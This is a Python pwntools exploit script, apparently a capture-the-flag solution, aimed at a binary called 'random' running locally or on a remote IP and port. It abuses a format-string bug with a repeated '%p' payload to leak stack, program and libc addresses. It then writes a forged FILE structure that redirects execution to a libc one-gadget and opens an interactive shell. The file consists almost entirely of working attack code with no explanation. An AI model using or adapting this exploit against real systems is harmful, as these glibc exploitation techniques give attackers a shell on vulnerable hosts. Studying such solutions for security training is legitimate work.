#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./random"
elf=ELF(pwn_file)
libc=ELF("./libc.so.6")
#heap_add=0
stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("58.20.46.150",41762)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    log.debug("libc add:0x%x"%libc.address)
    log.debug("elf add:0x%x"%elf.address)
    pause()

def fopen():
    r.send("1"+p32(0))

def fclose():
    r.send("3"+p32(0))

def leak(payload):
    r.sendline(payload)
    data = r.recvuntil("all")[:-3]
    r.send("1"+p32(0))
    return data

fopen()
fclose()
r.send("2"+p32(0))
data = leak("%p"*499)
idx = data.find("(nil)(nil)(nil)(nil)")
idx = data.find("0x",idx)
stack_add = int(data[idx+18:idx+18+14],16)
idx = data.find("a47")
elf.address = int(data[idx-11:idx+3],16) -0xa47
idx = data.find("830")
libc.address = int(data[idx-11:idx+3],16) - 0x20830

f={
    0:0x00000000fbad2088,
    0x70:p64(0x0000001000000000)+p64(0xffffffffffffffff)+p64(0)+p64(elf.address+0x2020e0),
    0x90:p64(0xffffffffffffffff),
    0xd8:p64(stack_add-0xb82),
    0x100:p64(libc.address+0xf02a4)
}
debug()
leak(fit(f,filler="\x00",length =499))
r.send("0"+p32(0))




r.interactive()
